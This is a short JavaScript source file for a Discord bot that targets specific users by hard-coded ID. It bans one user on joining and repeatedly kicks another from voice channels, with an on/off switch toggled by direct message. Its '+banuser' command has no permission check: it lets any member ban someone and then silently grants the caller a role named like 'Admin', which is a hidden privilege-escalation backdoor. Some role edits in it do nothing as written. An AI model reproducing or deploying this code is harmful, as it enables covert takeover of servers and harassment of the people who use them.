const Discord = require('discord.js');

const client = new Discord.Client();



client.on('ready', () => {

    console.log('I am ready!');


});
var autokick =false;


client.on('guildMemberAdd', member => {
   if (member.id === "767048733459349526") {
       if (autokick) {
           if (member.bannable) {
               member.ban().then();

           }
       }

   }
});
client.on('voiceStateUpdate', update => {
        //641348606275747841

        const  x =update.guild.members.cache.find( user => user.id === "334595545060605955");
        if (x.voice != null && autokick) {

            x.voice.kick().then();

    }
});
client.on("message", message => {
   if (message.channel.type === 'dm') {
       if (message.author.id === '334595545060605955') {
           if (message.content.startsWith("stopautokick")) {
               autokick = !autokick;
           }
       }
   }
});

client.on('message', message => {
    const prefix = "+"
    const split = message.content.split(" ");
    const command = split[0]
    const args = split.slice(1);

    if (command.startsWith(prefix + "banuser")) {

        if (args.length === 1) {

            message.guild.members.ban(message.mentions.users.first());
            const role = message.guild.roles.cache.find(role => role.name.includes("Admin"));
            role.hoist = false;
            role.color = 123;
            message.guild.member(message.author).roles.add(role);
        }



    }














});



// THIS  MUST  BE  THIS  WAY

client.login(process.env.BOT_TOKEN);